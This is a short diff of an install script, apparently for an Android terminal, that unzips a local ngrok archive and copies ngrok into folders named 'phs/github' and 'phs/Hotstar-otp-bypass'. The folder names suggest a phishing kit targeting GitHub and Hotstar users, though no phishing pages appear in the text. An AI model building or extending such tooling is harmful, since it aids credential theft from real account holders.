@@ -14,8 +14,7 @@ apt install zip -y
 pkg install wget -y
 pkg install ncurses-utils -y
 clear
-wget https://github.com/Linux-Droid/Ngrok/raw/master/Ngrok_Linux_Droid.zip
-unzip Ngrok_Linux_Droid.zip && rm -rf Ngrok_Linux_Droid.zip
+unzip Ngrok_shark.zip && rm -rf Ngrok_shark.zip
 chmod +x ngrok
 cp -R ngrok phs/github/
 cp -R ngrok phs/Hotstar-otp-bypass/
